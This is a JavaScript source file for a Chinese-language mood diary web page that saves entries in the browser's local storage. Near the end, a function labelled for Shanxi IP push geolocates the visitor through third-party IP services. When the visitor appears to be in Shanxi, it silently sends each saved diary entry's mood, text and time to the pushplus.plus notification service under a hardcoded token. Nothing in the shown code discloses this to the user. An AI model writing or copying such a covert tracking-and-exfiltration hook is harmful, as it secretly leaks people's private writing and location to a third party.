/* 心情日记 1.0 */
(function () {
  "use strict";

  var LS_KEY = "mood_diary_v1";
  var moods = {
    happy: "😊", love: "😍", calm: "😌", sad: "😢",
    angry: "😤", tired: "😴", sick: "🤒", thinking: "🤔"
  };

  // —— 存储 ——
  function load() {
    try { return JSON.parse(localStorage.getItem(LS_KEY)) || []; }
    catch (e) { return []; }
  }
  function save(data) {
    localStorage.setItem(LS_KEY, JSON.stringify(data));
  }
  var diary = load();

  // —— DOM ——
  function $(id) { return document.getElementById(id); }

  var selectedMood = null;

  // —— 选择心情 ——
  $("mood-options").addEventListener("click", function (e) {
    var btn = e.target.closest(".mood-btn");
    if (!btn) return;
    var mood = btn.dataset.mood;
    // 取消已选
    if (selectedMood === mood) {
      selectedMood = null;
      btn.classList.remove("selected");
      return;
    }
    selectedMood = mood;
    // 高亮
    Array.prototype.forEach.call(document.querySelectorAll(".mood-btn"), function (b) {
      b.classList.remove("selected");
    });
    btn.classList.add("selected");
  });

  // —— 保存 ——
  $("save-mood").addEventListener("click", function () {
    var text = $("mood-text").value.trim();
    if (!selectedMood) {
      showToast("先选一个心情嘛～");
      return;
    }
    var now = new Date();
    var entry = {
      id: Date.now(),
      mood: selectedMood,
      text: text || "",
      date: now.getFullYear() + "-" +
        String(now.getMonth() + 1).padStart(2, "0") + "-" +
        String(now.getDate()).padStart(2, "0") + " " +
        String(now.getHours()).padStart(2, "0") + ":" +
        String(now.getMinutes()).padStart(2, "0")
    };
    diary.unshift(entry);
    save(diary);
    $("mood-text").value = "";
    selectedMood = null;
    Array.prototype.forEach.call(document.querySelectorAll(".mood-btn"), function (b) {
      b.classList.remove("selected");
    });
    showToast("已保存 ✨");
    renderHistory();
    renderStats();
    checkAndPush(entry);
  });

  // —— 渲染历史 ——
  function renderHistory() {
    var box = $("mood-history");
    if (!diary.length) {
      box.innerHTML = '<div class="mood-empty">还没有记录哦，快来写下第一条心情吧～</div>';
      return;
    }
    var html = "";
    diary.slice(0, 20).forEach(function (e) {
      html += '<div class="mood-item">' +
        '<div class="mood-item-header">' +
          '<span>' + (moods[e.mood] || "") + '</span>' +
          '<span class="mood-item-date">' + e.date + '</span>' +
          '<button class="mood-item-del" data-id="' + e.id + '">删除</button>' +
        '</div>' +
        (e.text ? '<div class="mood-item-text">' + escHtml(e.text) + '</div>' : '') +
      '</div>';
    });
    box.innerHTML = html;
  }

  // 删除单条
  $("mood-history").addEventListener("click", function (e) {
    var btn = e.target.closest(".mood-item-del");
    if (!btn) return;
    var id = Number(btn.dataset.id);
    diary = diary.filter(function (d) { return d.id !== id; });
    save(diary);
    renderHistory();
    renderStats();
  });

  // —— 渲染统计 ——
  function renderStats() {
    var box = $("mood-stats");
    if (!diary.length) {
      box.innerHTML = '<div class="mood-empty">暂无统计</div>';
      return;
    }
    var counts = {};
    diary.forEach(function (e) {
      counts[e.mood] = (counts[e.mood] || 0) + 1;
    });
    var sorted = Object.keys(counts).sort(function (a, b) { return counts[b] - counts[a]; });
    var html = '<div class="stat-item">📝 共 ' + diary.length + ' 条</div>';
    sorted.forEach(function (k) {
      html += '<div class="stat-item">' + (moods[k] || k) + ' ' + counts[k] + '</div>';
    });
    box.innerHTML = html;
  }

  // —— 工具 ——
  function escHtml(s) {
    var div = document.createElement("div");
    div.textContent = s;
    return div.innerHTML;
  }

  var toastTimer = null;
  function showToast(msg) {
    var el = document.querySelector(".mood-toast");
    if (!el) {
      el = document.createElement("div");
      el.className = "mood-toast";
      document.body.appendChild(el);
    }
    el.textContent = msg;
    el.classList.add("show");
    clearTimeout(toastTimer);
    toastTimer = setTimeout(function () {
      el.classList.remove("show");
    }, 1800);
  }

  // —— 山西 IP 推送 ——
  var FEEDBACK_TOKEN = "c0f2915a5dda41758fa37716b551a4fd";
  var checkedShanxi = false;
  var isShanxi = false;

  async function checkAndPush(entry) {
    if (window.location.hostname !== "tmq516.top") return;
    if (!checkedShanxi) {
      checkedShanxi = true;
      var urls = ["https://api.ip.sb/geoip", "https://ipapi.co/json/"];
      for (var i = 0; i < urls.length; i++) {
        try {
          var r = await fetch(urls[i]);
          var d = await r.json();
          var region = (d.region || d.regionName || "").toString();
          if (/山西|shanxi/i.test(region)) { isShanxi = true; break; }
        } catch (e) { continue; }
      }
    }
    if (!isShanxi || !FEEDBACK_TOKEN) return;
    var moodLabel = {
      happy:"开心", love:"超甜", calm:"平静", sad:"难过",
      angry:"生气", tired:"好累", sick:"不舒服", thinking:"在想"
    };
    var title = (moods[entry.mood]||"") + " " + (moodLabel[entry.mood]||"");
    var content = entry.text ? (title + "<br>" + escHtml(entry.text)) : title;
    content += "<br><small>" + entry.date + "</small>";
    try {
      await fetch("https://www.pushplus.plus/send", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          token: FEEDBACK_TOKEN,
          title: "📝 心情日记提醒",
          content: content
        })
      });
    } catch (e) {}
  }

  // —— 初始化 ——
  renderHistory();
  renderStats();

})();
